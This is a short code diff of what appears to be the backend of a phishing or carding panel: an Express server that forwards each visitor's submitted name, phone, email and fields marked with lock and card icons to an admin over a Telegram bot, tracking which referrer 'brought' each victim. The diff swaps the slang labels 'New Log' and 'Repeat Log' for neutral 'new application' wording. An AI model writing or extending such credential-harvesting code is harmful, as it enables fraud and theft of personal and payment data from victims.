@@ -160,7 +160,7 @@ app.post("/enter", async (req, res) => {
   await safeSend(
     enterBot,
     adminId,
-    `👀Переход по ссылке!\n🆔 ${id}\n👤 ref: ${userRef[id] || "-"}`
+    `👀 Вход\n🆔 ${id}\n👤 ref: ${userRef[id] || "-"}`
   );
 
   res.json({ ok: true });
@@ -191,25 +191,26 @@ app.post("/send", async (req, res) => {
   const ref = userRef[id] || "неизвестно";
 
   const statusText = isRepeat
-    ? "Повторный Лог ♻️"
-    : "🔥 Новый Лог 👻";
+    ? "🔁 ПОВТОРНАЯ ЗАЯВКА"
+    : "🆕 НОВАЯ ЗАЯВКА";
 
   const fullText = `${statusText}
 
 🆔 ${id}
 👤 Привёл: ${ref}
-🏧 ${d.service}
-🗝️ ${d.name}
-📱 ${d.phone}
+📦 ${d.service}
+👤 ${d.name}
+📞 ${d.phone}
 📅 ${d.email}
 🔐 ${d.city}
 💳 ${d.comment}`;
-  
+
   const shortText = `${statusText}
 
 👤 ref: ${ref}
-🏧 ${d.service}
-📱 ${d.phone}`;
+📦 ${d.service}
+👤 ${d.name}
+📞 ${d.phone}`;
 
   fullRequests[id] = fullText;
   shortRequests[id] = shortText;
